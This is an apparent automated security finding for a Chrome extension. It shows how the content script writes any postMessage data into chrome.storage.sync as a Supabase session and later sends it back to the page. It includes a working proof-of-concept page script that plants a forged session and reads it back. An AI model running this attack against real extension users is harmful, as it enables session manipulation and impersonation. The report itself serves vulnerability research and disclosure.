# CoCo Analysis: eplpoinbodfbbkfgmbpojghiajooglcn

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: cs_window_eventListener_message → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/eplpoinbodfbbkfgmbpojghiajooglcn/opgen_generated_files/cs_0.js
Line 493: `window.addEventListener('message', function (event) {`
Line 494: `if (event.data.action === 'SIGNED_IN') {`
Line 497: `chrome.storage.sync.set({ supabaseSession: event.data.session });`

**Code:**

```javascript
// Content script - Entry point (cs_0.js)
// Step 1: Attacker poisons storage
window.addEventListener('message', function (event) {
  if (event.data.action === 'SIGNED_IN') {
    console.log('SETTING SESSION', event);
    chrome.storage.sync.set({ supabaseSession: event.data.session }); // ← attacker-controlled
  }
});

// Step 2: Attacker retrieves poisoned data
window.addEventListener('message', function (event) {
  if (event.data.action === 'GET_SESSION') {
    console.log('Web app requested session. Sending it back. || CONTENT.JS');
    chrome.storage.sync.get('supabaseSession', (data) => {
      const session = data.supabaseSession; // ← attacker's poisoned data
      console.log('Session retrieved from storage:', session);
      // Send the poisoned session back to attacker
      var iframe = document.getElementById('webapp-iframe');
      iframe.contentWindow.postMessage({ action: 'SESSION_RESPONSE', session: session}, '*'); // ← flows to attacker
    });
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage (DOM event)

**Attack:**

```javascript
// On a malicious webpage where the extension's content script runs (matches: <all_urls>)

// Step 1: Poison the storage with malicious session data
window.postMessage({
  action: 'SIGNED_IN',
  session: {
    access_token: 'attacker_controlled_token',
    user: { id: 'malicious_user_id', email: 'attacker@evil.com' }
  }
}, '*');

// Step 2: Retrieve the poisoned session
window.postMessage({ action: 'GET_SESSION' }, '*');

// Step 3: Listen for the response containing poisoned data
window.addEventListener('message', function(event) {
  if (event.data.action === 'SESSION_RESPONSE') {
    console.log('Retrieved poisoned session:', event.data.session);
    // Attacker now has confirmation of successful storage poisoning
    // and can manipulate the extension's authentication state
  }
});
```

**Impact:** Complete storage exploitation chain - attacker can poison the Supabase session stored by the extension and retrieve it back, allowing the attacker to manipulate the extension's authentication state and impersonate legitimate sessions. This constitutes information disclosure and session manipulation.
